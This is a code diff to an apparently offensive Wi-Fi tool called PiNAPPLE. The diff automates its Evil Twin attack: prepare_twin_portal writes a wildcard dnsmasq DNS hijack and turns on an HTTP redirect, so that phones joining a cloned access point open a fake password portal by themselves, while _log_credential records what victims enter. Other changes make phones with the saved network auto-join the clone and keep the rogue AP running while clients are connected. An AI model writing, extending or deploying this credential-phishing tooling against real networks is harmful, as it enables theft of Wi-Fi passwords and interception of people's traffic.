@@ -1398,7 +1398,8 @@ def watchdog_loop():
             if (_evil_twin_job[0] is not None and not _evil_twin_starting[0]
                     and _twin_ap_since[0]
                     and time.time() - _twin_ap_since[0] > TWIN_IDLE_REVERT_SECONDS
-                    and not _twin_seen_client[0]):
+                    and not _twin_seen_client[0]
+                    and _twin_clients() == 0):
                 audit('Twin had no clients after %ds; restoring the normal AP'
                       % TWIN_IDLE_REVERT_SECONDS, 'warn')
                 _evil_twin_shutdown()
@@ -4029,7 +4030,68 @@ def _active_portal_slug():
         target = os.readlink(ACTIVE_PORTAL)
         return os.path.splitext(os.path.basename(target))[0] or 'unknown'
     except OSError:
-        return 'unknown'
+        # A deploy can replace the symlink with the stock redirect page.
+        try:
+            return str(load_config().get('portal_type') or 'unknown')
+        except Exception:
+            return 'unknown'
+
+
+def set_active_portal(slug):
+    """Point /opt/pinapple/portal/index.html at the chosen template."""
+    src = os.path.join(PORTAL_DIR, str(slug) + '.html')
+    if not os.path.exists(src):
+        return False
+    try:
+        if os.path.lexists(ACTIVE_PORTAL):
+            os.remove(ACTIVE_PORTAL)
+        os.symlink(src, ACTIVE_PORTAL)
+        return True
+    except OSError:
+        return False
+
+
+def ensure_active_portal():
+    """Repair the portal symlink after a deploy overwrote it with a file."""
+    if os.path.islink(ACTIVE_PORTAL):
+        return
+    slug = str(load_config().get('portal_type') or '')
+    if slug and set_active_portal(slug):
+        audit('Restored the active portal link to %s' % slug, 'warn')
+
+
+def prepare_twin_portal():
+    """Plug-and-play captive portal setup for an Evil Twin run.
+
+    Points the portal at the configured template and turns on DNS hijack and
+    the HTTP redirect, so a joining phone opens the portal by itself. Returns
+    the list of things that changed (for the start response).
+    """
+    notes = []
+    cfg = load_config()
+    slug = str(cfg.get('portal_type') or 'wifi-psk')
+    if slug not in [p[0] for p in list_portals()]:
+        slug = 'wifi-psk'
+    if set_active_portal(slug):
+        notes.append('portal=%s' % slug)
+    try:
+        portal_ip = iface_ip('wlan0') or '10.0.0.1'
+        with open(DNSMASQ_HIJACK, 'w') as handle:
+            handle.write('address=/#/%s\n' % portal_ip)
+        open(FLAG_DNS, 'w').close()
+        notes.append('dns-hijack=on')
+    except OSError as exc:
+        notes.append('dns-hijack failed: %s' % exc)
+    try:
+        subprocess.run(['/usr/local/bin/pinapple-portal', 'on'],
+                       capture_output=True, timeout=20)
+        open(FLAG_PORTAL, 'w').close()
+        notes.append('portal-redirect=on')
+    except Exception as exc:
+        notes.append('portal-redirect failed: %s' % exc)
+    audit('Evil Twin portal prepared: %s' % ', '.join(notes))
+    return notes
+
 
 
 def _log_credential(client_ip, client_mac, portal_type, data):
@@ -4444,13 +4506,7 @@ def api_evil_twin_start():
             and str(scan_channel) != str(data.get('channel')):
         channel_notes.append('using the real target channel %d instead of %s'
                              % (scan_channel, data.get('channel')))
-    if not os.path.exists(FLAG_DNS) and not os.path.exists(FLAG_PORTAL):
-        channel_notes.append('the captive portal will not appear by itself: enable '
-                             'DNS Hijack or Portal Redirect on the Overview')
-    active_slug = _active_portal_slug()
-    if active_slug != 'wifi-psk':
-        channel_notes.append('active portal is "%s": select Router Update in Settings '
-                             'to validate passwords' % active_slug)
+    prepare_twin_portal()
     psk = str(data.get('psk', '') or '').strip()
     if psk and not (8 <= len(psk.encode('utf-8', 'ignore')) <= 63):
         return jsonify({'ok': False,
@@ -5585,6 +5641,11 @@ async function startEvilTwin(){
   const psk = (document.getElementById('et-psk').value || '').trim();
   if(!ssid || !bssid){ toast('Enter both the target SSID and BSSID.', 'warn'); return; }
   if(psk && (psk.length < 8 || psk.length > 63)){ toast('The WPA2 passphrase must be 8-63 characters.', 'warn'); return; }
+  const target = reconLookup(bssid);
+  const enc = target && target.encryption;
+  if(enc && enc !== 'Open' && !psk){
+    if(!confirm('"' + ssid + '" is ' + enc + '.\n\nA phone that saved that network will refuse an open clone and report "failed to join". Enter the Wi-Fi password in the passphrase field to let it join by itself, or continue with an open clone anyway.')) return;
+  }
   if(!confirm('Start Evil Twin for "' + ssid + '"?\n\nThis reconfigures wlan0 and may disconnect this phone from the PiNAPPLE hotspot.')) return;
 
   const btn = document.getElementById('et-start');
@@ -6080,6 +6141,7 @@ if __name__ == '__main__':
         except OSError:
             pass
     ensure_config()
+    ensure_active_portal()
     restore_network_flags()
     migrate_eviltwin_backup()
     reconcile_eviltwin_state()
